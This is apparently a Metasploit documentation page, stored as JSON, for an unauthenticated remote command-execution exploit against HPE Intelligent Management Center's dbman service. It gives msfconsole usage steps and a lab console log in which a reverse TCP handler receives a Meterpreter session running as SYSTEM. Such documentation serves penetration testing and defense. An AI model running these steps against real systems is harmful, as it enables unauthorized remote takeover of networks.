{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce","result":{"data":{"moduleMetadataJson":{"id":"ea7b5cf6-2bf0-5a2f-bdfe-6d8a0f90ec34","name":"HPE iMC dbman RestartDB Unauthenticated RCE","fullname":"exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce","description":"This module exploits a remote command execution vulnerablity in\n        Hewlett Packard Enterprise Intelligent Management Center before\n        version 7.3 E0504P04.\n\n        The dbman service allows unauthenticated remote users to restart\n        a user-specified database instance (OpCode 10008), however the\n        instance ID is not sanitized, allowing execution of arbitrary\n        operating system commands as SYSTEM. This service listens on\n        TCP port 2810 by default.\n\n        This module has been tested successfully on iMC PLAT v7.2 (E0403)\n        on Windows 7 SP1 (EN).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce","documentationSlug":"/modules/documentation/exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits a remote command execution vulnerablity in Hewlett Packard Enterprise Intelligent Management Center before version 7.3 E0504P04.</p>\n<p>  The dbman service allows unauthenticated remote users to restart a user-specified database instance (OpCode 10008), however the instance ID is not sanitized, allowing execution of arbitrary operating system commands as SYSTEM. This service listens on TCP port 2810 by default.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  <a href=\"https://www.hpe.com/au/en/product-catalog/networking/intelligent-management-software/pip.hp-intelligent-management-center-enterprise-software-platform.4176520.html\">HPE Intelligent Management Center Enterprise Software Platform</a> is a comprehensive wired and wireless network management tool.</p>\n<p>  This module has been tested successfully on:</p>\n<ul>\n<li>iMC PLAT v7.2 (E0403) on Windows 7 SP1 (EN).</li>\n</ul>\n<p>  Installer:</p>\n<ul>\n<li><a href=\"https://h10145.www1.hpe.com/Downloads/DownloadSoftware.aspx?SoftwareReleaseUId=16759&#x26;ProductNumber=JG747AAE&#x26;lang=en&#x26;cc=us&#x26;prodSeriesId=4176535&#x26;SaidNumber=\">iMC PLAT v7.2 (E0403) Standard</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">use exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;IP&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce \nmsf exploit(windows/misc/hp_imc_dbman_restartdb_unauth_rce) &gt; set rhost 172.16.191.166\nrhost =&gt; 172.16.191.166\nmsf exploit(windows/misc/hp_imc_dbman_restartdb_unauth_rce) &gt; check\n[*] 172.16.191.166:2810 The target service is running, but could not be validated.\nmsf exploit(windows/misc/hp_imc_dbman_restartdb_unauth_rce) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(windows/misc/hp_imc_dbman_restartdb_unauth_rce) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[*] 172.16.191.166:2810 - Powershell command length: 6091\n[*] 172.16.191.166:2810 - Sending payload (6091 bytes)...\n[*] Sending stage (179779 bytes) to 172.16.191.166\n[*] Meterpreter session 1 opened (172.16.191.181:4444 -&gt; 172.16.191.166:55316) at 2018-01-05 03:23:55 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : WIN-SGBSD5TQUTQ\nOS              : Windows 7 (Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 3\nMeterpreter     : x86/windows</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"ea7b5cf6-2bf0-5a2f-bdfe-6d8a0f90ec34"}}}